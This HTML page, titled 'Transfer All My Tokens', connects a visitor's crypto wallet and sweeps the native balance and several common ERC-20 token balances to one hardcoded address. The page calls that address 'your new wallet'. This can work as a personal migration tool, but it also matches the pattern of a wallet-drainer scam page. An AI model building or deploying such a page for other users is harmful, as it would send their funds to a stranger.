<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Transfer All My Tokens</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
  <style>
    body { font-family: system-ui, sans-serif; padding: 20px; background: #f4f6fa; text-align: center; }
    .box { max-width: 560px; margin: 40px auto; background: white; padding: 30px; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
    button { padding: 14px 28px; font-size: 18px; margin: 15px; border: none; border-radius: 12px; cursor: pointer; }
    .btn-connect { background: #6366f1; color: white; }
    .btn-transfer { background: #10b981; color: white; font-weight: bold; }
    .btn-disconnect { background: #ef4444; color: white; }
    .address { font-family: monospace; background: #f3f4f6; padding: 12px; border-radius: 8px; margin: 20px 0; word-break: break-all; }
    #result { margin-top: 20px; padding: 15px; border-radius: 8px; display: none; }
    .success { background: #d1fae5; color: #065f46; }
    .error { background: #fee2e2; color: #991b1b; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Transfer All My Tokens</h1>
    <p>Connect your OLD wallet → click the green button → confirm each transaction in MetaMask.</p>

    <button id="connectBtn" class="btn-connect">Connect Old Wallet</button>
    <button id="disconnectBtn" class="btn-disconnect" style="display:none;">Disconnect</button>

    <div id="info" style="display:none; margin-top: 30px;">
      <p><strong>Old wallet:</strong><br><span class="address" id="oldAddress"></span></p>
      <p><strong>New wallet (receiving):</strong><br><span class="address">0x31488b2d9a4e1ae7af6c029569650d6ab229be5c</span></p>

      <button id="transferAllBtn" class="btn-transfer">Transfer EVERYTHING to New Wallet</button>
      <div id="result"></div>
    </div>
  </div>

  <script>
    const NEW_WALLET = "0x31488b2d9a4e1ae7af6c029569650d6ab229be5c";
    let web3, provider, oldAddress;

    document.getElementById('connectBtn').onclick = async () => {
      if (window.ethereum) {
        provider = window.ethereum;
        web3 = new Web3(provider);
        await window.ethereum.request({ method: 'eth_requestAccounts' });
      } else {
        provider = new WalletConnectProvider.default({ qrcode: true });
        await provider.enable();
        web3 = new Web3(provider);
      }
      [oldAddress] = await web3.eth.getAccounts();
      document.getElementById('oldAddress').textContent = oldAddress;
      document.getElementById('info').style.display = 'block';
      document.getElementById('connectBtn').style.display = 'none';
      document.getElementById('disconnectBtn').style.display = 'inline-block';
    };

    document.getElementById('disconnectBtn').onclick = () => location.reload();

    document.getElementById('transferAllBtn').onclick = async () => {
      if (confirm("This will send 100% of your native token + ALL ERC-20 tokens to your new wallet.\n\nContinue?")) {
        document.getElementById('result').style.display = 'none';
        await transferEverything();
      }
    };

    async function transferEverything() {
      const result = document.getElementById('result');
      result.className = 'success';
      result.textContent = 'Starting transfer... check your wallet!';
      result.style.display = 'block';

      try {
        // 1. Send native token (leave 0.001 for gas on current chain)
        const nativeBalance = await web3.eth.getBalance(oldAddress);
        const gasPrice = await web3.eth.getGasPrice();
        const gasForLaterTxs = gasPrice * 300000n; // rough reserve
        const nativeToSend = nativeBalance - gasForLaterTxs;
        if (nativeToSend > 0) {
          await web3.eth.sendTransaction({
            from: oldAddress,
            to: NEW_WALLET,
            value: nativeToSend
          });
          result.textContent += `\nNative token sent!`;
        }

        // 2. Find & send all ERC-20 tokens (top 50 common ones + any with balance)
        const commonTokens = {
          // Ethereum / Polygon / BSC / Arbitrum common tokens
          "0xdAC17F958D2ee523a2206206994597C13D831ec7": "USDT",
          "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "USDC",
          "0x6B175474E89094C44Da98b954EedeAC495271d0F": "DAI",
          "0x514910771AF9Ca656af840dff83E8264EcF986CA": "LINK",
          "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0": "MATIC (Polygon)",
          "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174": "USDC (Polygon)",
          "0x8f3Cf7ad23Cd3CaDb8Aa5F0C3f96F6D746E5C968": "USDT (Polygon)",
        };

        const erc20ABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];

        for (const [addr, name] of Object.entries(commonTokens)) {
          try {
            const token = new web3.eth.Contract(erc20ABI, addr);
            const balance = await token.methods.balanceOf(oldAddress).call();
            if (balance > 0) {
              await token.methods.transfer(NEW_WALLET, balance).send({ from: oldAddress });
              result.textContent += `\n${name} sent!`;
            }
          } catch (e) { /* ignore tokens not on this chain or errors */ }
        }

        result.textContent += `\n\nAll done! Check your new wallet`;
      } catch (err) {
        result.className = 'error';
        result.textContent = 'Error: ' + (err.message || err);
      }
    }
  </script>
</body>
</html>